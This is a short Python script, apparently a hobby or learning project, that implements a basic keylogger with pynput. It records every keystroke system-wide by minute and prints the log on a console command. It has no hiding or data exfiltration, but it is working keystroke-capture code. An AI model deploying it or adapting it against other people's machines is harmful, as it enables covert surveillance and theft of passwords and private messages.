from datetime import datetime
import threading
import sys
from pynput import keyboard
from collections import defaultdict

press_char = defaultdict(list)
running = True  # To allow clean exit from the program


def on_press(key):
    """ Listens for key presses and stores them by minute """
    try:
        formatted_date = datetime.now().strftime("%d/%m/%Y %H:%M")
        if hasattr(key, 'char') and key.char is not None:
            press_char[formatted_date].append(key.char)
        else:
            press_char[formatted_date].append(key.name if hasattr(key, "name") else str(key))
    except Exception as e:
        print(f"error: {e}")


def show_pressed_key():
    """ Displays all recorded key presses, grouped by minute """
    if not press_char:
        print("❌ No data to display.")
        return
    print("\n📋 **Recorded Key Presses:**")
    for minute, keys in sorted(press_char.items()):
        print(f"🕒 {minute}: \n {', '.join(keys)}")
    print()


def command_listener():
    """ Continuously listens for user commands while key logging continues """
    global running
    while running:
        command = input("📢 Enter command (SHOW / EXIT): ").strip().upper()
        if command == "SHOW":
            show_pressed_key()
        elif command == "EXIT":
            print("📴 Shutting down the program...")
            running = False
            break
        else:
            print(f"❌ Unknown command: {command}")


# 🔴 Start key listener in a separate thread (background)
listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).start(), daemon=True)
listener_thread.start()

# 🔵 Main loop for user commands - this will continue while listener is running
command_listener()

#RAFI EDIT 